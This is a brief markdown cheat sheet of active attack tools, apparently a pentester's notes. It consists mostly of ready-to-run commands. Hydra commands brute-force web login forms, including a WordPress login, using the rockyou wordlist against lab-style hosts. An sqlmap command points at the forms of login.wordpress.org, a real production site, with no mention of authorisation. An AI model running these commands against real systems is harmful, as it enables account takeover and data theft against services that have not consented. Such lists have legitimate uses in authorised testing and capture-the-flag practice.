# Active-Sanning
This is a list of tools that will help with attack but may show alerts on IDS as you are sending many requests.

## Brute Force 
May result in IP ban if too many requests are made.
### Hydra
Used to brute force users on websites
```bash
hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
hydra -l Elliot -P /usr/share/wordlists/rockyou.txt 10.10.118.169 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Username or passwordis incorrect" -t 35
hydra -l users.txt -P /usr/share/wordlists/rockyou.txt api-prod.horizontall.htb http-post-form "/admin/auth/login:'{"identifier":'^USER^',"password":'^PASS^}:Identifier or password invalid." -t 35

```
## SQL
### SQLmap
```bash
	sqlmap -u https://login.wordpress.org --forms
```
